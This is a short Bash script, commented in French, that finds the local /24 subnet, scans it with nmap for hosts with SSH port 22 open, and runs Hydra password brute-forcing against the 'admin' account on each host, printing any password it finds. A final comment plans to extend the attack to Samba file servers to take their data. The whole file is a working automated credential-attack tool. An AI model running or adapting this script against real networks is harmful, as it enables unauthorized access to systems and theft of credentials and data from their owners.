#!/bin/bash

# Script permettant de scanner l'integralite du sous reseau sur lequel se trouve la machine source. Le but etant de trouver des cibles avec le port 22 ouvert sur les sous réseu en /24 (à ameliorer).
# Le script va alors lancer une campagne de brutforce sur l'utilisateur "admin" (amelioration prevue pour agrandir ce parametre)

echo "Demarrage du script de scan et de bruteforce SSH"

# Recupere l'ip de la machine source
echo "Recuperation de l'adresse IP de la machine source"
host_ip=$(hostname -I | cut -d' ' -f1)
echo "Adresse IP detectee : $host_ip"

subnet=$(echo $host_ip | cut -d'.' -f1-3).0/24
echo "Le sous-reseau cible pour le scan est : $subnet"

# Lancer Nmap pour identifier les h  tes avec le port 22 ouvert
echo "Lancement du scan Nmap sur $subnet pour les cibles avec le port 22 ouvert..."
nmap -p 22 --open $subnet -oG - | grep "/open/" | cut -d' ' -f2 > ssh-ouvert.txt

if [ ! -s ssh-ouvert.txt ]; then
    echo "Aucune cibles avec le port 22 ouvert detecte. Fin du script."
    exit 1
else
    echo "Cible avec le port 22 ouvert detectes. Preparation au bruteforce avec Hydra"
fi

# Utilise les hotes recuperes dans le fichier ssh-ouvert.txt et utiliser Hydra pour le bruteforce
while IFS= read -r host; do
    echo "Lancement du bruteforce SSH sur $host avec Hydra..."

    # Executer Hydra et tester les mots de passe avec la wordlist (se trouvant par defauts dans Kali). Teste les mots de passe 4 par 4 
    hydra_go=$(hydra -l admin -P /usr/share/dict/wordlist-probable.txt -t 4 ssh://$host)

    # Verifier si Hydra a reussi   a trouver le mot de passe
    if echo "$hydra_go" | grep -q "1 valid password found"; then
        echo "Succes : Un mot de passe a ete trouve pour $host."
        echo "$hydra_go" | grep "password:"  # Afficher le mot de passe
    else
        echo "echec : Aucun mot de passe n'a ete trouve pour $host."
    fi

    echo "Fin de la tentative sur la cible $host. Passage au suivant, s'il existe..."
done < ssh-ouvert.txt

echo "Script termine."

# Je peux pense partir sur diverses ameliorations, notamment par exemple, identifie sur un serveur de fichier de style Samba et récupéré les données dessus en ayant brutforce aussi 
+